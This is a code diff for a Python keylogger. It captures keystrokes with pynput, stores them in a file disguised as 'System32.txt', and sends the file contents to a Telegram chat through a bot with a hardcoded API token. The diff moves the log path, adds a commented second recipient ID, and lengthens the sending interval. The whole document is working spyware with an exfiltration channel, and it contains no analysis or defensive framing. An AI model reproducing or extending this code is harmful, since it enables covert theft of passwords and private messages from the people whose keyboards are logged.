@@ -5,7 +5,7 @@ import telebot
 from pynput.keyboard import Key, Listener
 
 API_TOKEN = '6071630449:AAHslhDKXn83m8gsfsB8m4_hQvw9-9N5pWE'
-file_path = "C:\\System\\System32.txt"
+file_path = "C:\\Pythons\\System\\System32.txt"
 
 bot = telebot.TeleBot(API_TOKEN)
 
@@ -41,10 +41,10 @@ def send_message_periodically():
                         start_file.write('start')
                     first_run = False  # Mark the first run as completed
                 bot.send_message('973147838', file_contents)
-                # bot.send_message('', file_contents)
+                # bot.send_message('717470905', file_contents) # id mihail
             except Exception as e:
                 print('Error:', str(e))
-        time.sleep(15)
+        time.sleep(120)
 
 
 message_thread = threading.Thread(target=send_message_periodically)
